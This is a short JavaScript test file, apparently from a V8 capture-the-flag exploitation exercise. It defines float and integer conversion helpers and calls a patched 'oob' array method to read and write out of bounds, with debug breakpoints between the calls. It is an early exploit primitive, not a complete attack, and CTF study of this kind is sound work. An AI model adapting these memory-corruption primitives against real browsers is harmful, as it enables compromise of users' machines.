/*************************************************************
 * File Name: oob_test.js
 * 
 * Created on: 2019-11-27 00:18:20
 * Author: raycp
 * 
 * Last Modified: 2019-11-27 03:49:26
 * Description: oob test
************************************************************/
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

// Floating point to 64-bit unsigned integer
function f2i(f)

{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}


var a=[1.1, 2.2];

console.log("a.oob: 0x"+hex(f2i(a.oob())));
%DebugPrint(a);
%DebugPrint(a.constructor);
%SystemBreak();
a.oob(1.1);
//%DebugPrint(a);
%SystemBreak();

